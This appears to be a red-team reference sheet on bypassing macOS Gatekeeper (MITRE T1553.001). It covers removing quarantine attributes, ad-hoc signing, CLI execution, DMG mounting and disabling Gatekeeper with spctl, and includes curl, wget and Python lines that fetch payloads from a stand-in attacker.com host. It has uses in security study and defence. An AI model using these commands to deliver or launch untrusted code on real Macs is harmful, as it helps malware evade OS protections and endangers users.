# macOS Gatekeeper Bypass

Techniques to bypass Gatekeeper and execute unsigned or unnotarized code.

**MITRE ATT&CK**: T1553.001 — Gatekeeper Bypass

---

## How Gatekeeper Works

1. Files downloaded via browsers/email get a **quarantine attribute** (`com.apple.quarantine`)
2. When the user opens a quarantined file, Gatekeeper checks:
   - Code signature validity
   - Notarization status (signed by Apple-verified developer)
   - XProtect malware signatures
3. If checks fail → execution blocked with a warning dialog

---

## 1. Quarantine Attribute Removal

```bash
# Check for quarantine attribute
xattr -l /path/to/file.app
# Look for: com.apple.quarantine

# Remove quarantine attribute
xattr -d com.apple.quarantine /path/to/file.app

# Remove recursively (for .app bundles)
xattr -dr com.apple.quarantine /path/to/file.app

# Remove all extended attributes
xattr -cr /path/to/file.app
```

---

## 2. Downloads Without Quarantine

These methods create files **without** the quarantine attribute:

```bash
# curl does NOT set quarantine
curl -o payload.sh https://attacker.com/payload.sh
# → No quarantine attribute, Gatekeeper never checks it

# wget does NOT set quarantine
wget https://attacker.com/payload.sh

# scp / sftp
scp attacker@host:/path/to/payload.sh ./

# git clone
git clone https://github.com/attacker/repo.git

# pip install
pip install malicious-package

# brew install (Homebrew casks DO set quarantine, formulae do NOT)
brew install --formula malicious-tool

# Python/Ruby/Node downloading files programmatically
python3 -c "import urllib.request; urllib.request.urlretrieve('https://attacker.com/payload', 'payload')"

# Unzipping from Terminal (Archive Utility sets quarantine, unzip doesn't)
unzip archive.zip         # No quarantine
# vs
open archive.zip          # Archive Utility → quarantine applied to extracted files
```

---

## 3. CLI Execution Bypasses Gatekeeper

```bash
# Terminal/CLI execution skips Gatekeeper entirely for scripts
chmod +x payload.sh
./payload.sh
# Gatekeeper only checks .app bundles and Mach-O binaries opened through LaunchServices

# Interpreters bypass Gatekeeper for their scripts
python3 payload.py
bash payload.sh
ruby payload.rb
osascript payload.scpt
```

---

## 4. Ad-Hoc Code Signing

```bash
# Sign with ad-hoc identity (makes it pass basic signature checks)
codesign -s - /path/to/binary
codesign -s - --deep /path/to/app.app

# Verify signature
codesign -dvvv /path/to/binary 2>&1

# Remove signature
codesign --remove-signature /path/to/binary
```

---

## 5. DMG Mounting from CLI

```bash
# DMGs opened from Finder have quarantine propagated to contents
# DMGs mounted from CLI may not:
hdiutil attach payload.dmg -nobrowse -quiet
# -nobrowse: don't show in Finder
# Contents may not inherit quarantine depending on macOS version
```

---

## 6. App Translocation Bypass

macOS moves quarantined apps to a random read-only path on first launch (App Translocation). This can interfere with apps that need to write to their own directory.

```bash
# Check if an app is being translocated
/usr/bin/log show --predicate 'process == "syspolicyd" AND eventMessage CONTAINS "translocation"' --last 5m

# To avoid translocation: move the app (Finder move removes quarantine on some versions)
# Or remove quarantine attribute before first launch
```

---

## 7. spctl Assessment

```bash
# Check if Gatekeeper would block a file
spctl --assess -v /path/to/app.app
# "accepted" = would be allowed
# "rejected" = would be blocked

# Check with specific context
spctl --assess --type execute -v /path/to/binary
spctl --assess --type install -v /path/to/package.pkg

# Disable Gatekeeper entirely (requires admin, reverted by MDM)
sudo spctl --master-disable

# Re-enable
sudo spctl --master-enable
```

---

## 8. Safari "Safe" File Types

Safari auto-opens "safe" files by default. These file types are opened without additional Gatekeeper prompts:

- `.dmg` — Disk images (auto-mount)
- `.pkg` — Installer packages (opens Installer.app)
- `.webarchive` — Safari web archives
- `.webloc` — Web location files

```bash
# Check Safari safe file settings
defaults read com.apple.Safari AutoOpenSafeDownloads
# true = auto-opens safe files (default)
```

---

## Summary Table

| Technique | Requires | Stealth |
|-----------|----------|---------|
| xattr removal | File access | Low (modifies xattr) |
| curl/wget download | Code execution | High (no quarantine set) |
| CLI execution | Code execution | High (Gatekeeper not invoked) |
| Ad-hoc signing | Code execution | Medium (basic checks pass) |
| spctl --master-disable | Admin | Low (system-wide change) |
| DMG CLI mount | Code execution | Medium |
| Safari auto-open | User clicks link | Medium |
